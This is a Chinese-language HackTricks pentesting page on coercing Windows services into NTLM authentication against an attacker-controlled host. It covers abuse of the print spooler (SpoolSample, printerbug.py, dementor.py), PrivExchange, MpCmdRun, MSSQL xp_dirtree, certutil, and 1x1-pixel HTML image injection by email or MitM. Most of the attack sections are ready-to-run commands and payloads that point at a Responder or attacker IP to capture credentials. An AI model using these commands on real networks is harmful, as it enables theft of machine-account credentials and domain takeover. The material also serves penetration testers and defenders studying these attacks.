# 强制使用 NTLM 特权身份验证

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 您在**网络安全公司**工作吗？ 想要看到您的**公司在 HackTricks 中被广告**吗？ 或者您想要访问**PEASS 的最新版本或下载 HackTricks 的 PDF**吗？ 请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方 PEASS & HackTricks 衣服**](https://peass.creator-spring.com)
* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注**我的 **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向 [hacktricks 仓库](https://github.com/carlospolop/hacktricks) 和 [hacktricks-cloud 仓库](https://github.com/carlospolop/hacktricks-cloud) 提交 PR 来分享您的黑客技巧**。

</details>

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) 是一个使用 MIDL 编译器编写的 **远程身份验证触发器** 集合，用于避免第三方依赖。

## Spooler Service 滥用

如果 _**打印池**_ 服务已**启用**，您可以使用一些已知的 AD 凭据向域控制器的打印服务器**请求**更新新的打印作业，并告诉它**将通知发送到某个系统**。\
请注意，当打印机将通知发送到任意系统时，它需要对该系统进行**身份验证**。因此，攻击者可以使 _**打印池**_ 服务对任意系统进行身份验证，而服务将在此身份验证中**使用计算机帐户**。

### 查找域上的 Windows 服务器

使用 PowerShell 获取 Windows 服务器列表。通常服务器是优先级较高的，所以让我们专注于这里：
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### 寻找正在监听的 Spooler 服务

使用稍作修改的 @mysmartlogin（Vincent Le Toux）的 [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket)，查看 Spooler 服务是否正在监听：
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
您也可以在Linux上使用rpcdump.py并查找MS-RPRN协议。
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
### 请求服务对任意主机进行身份验证

您可以从[**这里编译SpoolSample**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**。**
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
或者在 Linux 上使用 [**3xocyte 的 dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) 或 [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py)。
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
### 结合无限制委派

如果攻击者已经成功入侵了一个启用了[无限制委派](unconstrained-delegation.md)的计算机，攻击者可以**让打印机对该计算机进行身份验证**。由于无限制委派，**打印机的计算机帐户的TGT将保存在**具有无限制委派的计算机的**内存**中。由于攻击者已经控制了这台主机，他将能够**检索此票证**并滥用它（[传递票证](pass-the-ticket.md)）。

## RCP 强制身份验证

{% embed url="https://github.com/p0dalirius/Coercer" %}

## PrivExchange

`PrivExchange` 攻击是在**Exchange Server `PushSubscription`功能**中发现的一个缺陷的结果。该功能允许任何具有邮箱的域用户强制Exchange服务器通过HTTP对任何客户端提供的主机进行身份验证。

默认情况下，**Exchange服务以SYSTEM身份运行**并被赋予过多的特权（具体来说，在2019年之前的累积更新中，它具有**对域的WriteDacl特权**）。可以利用此缺陷来实现**将信息中继到LDAP，随后提取域NTDS数据库**。在无法中继到LDAP的情况下，仍然可以利用此缺陷来中继和对域内的其他主机进行身份验证。成功利用此攻击将立即授予具有任何经过身份验证的域用户帐户的域管理员访问权限。

## 在Windows内部

如果您已经在Windows机器内部，您可以使用以下命令强制Windows使用特权帐户连接到服务器：

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
或者使用另一种技术：[https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

可以使用 certutil.exe lolbin（Microsoft 签名的二进制文件）来强制执行 NTLM 认证：
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML注入

### 通过电子邮件

如果您知道要入侵的计算机中登录用户的**电子邮件地址**，您可以发送一封带有**1x1像素图像**的电子邮件，例如
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
### MitM

如果您可以对计算机执行中间人攻击，并在他将要查看的页面中注入HTML，您可以尝试在页面中注入如下图像：
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## 破解 NTLMv1

如果你能捕获[NTLMv1挑战，请阅读此处如何破解它们](../ntlm/#ntlmv1-attack)。\
_请记住，为了破解NTLMv1，你需要将Responder挑战设置为"1122334455667788"_
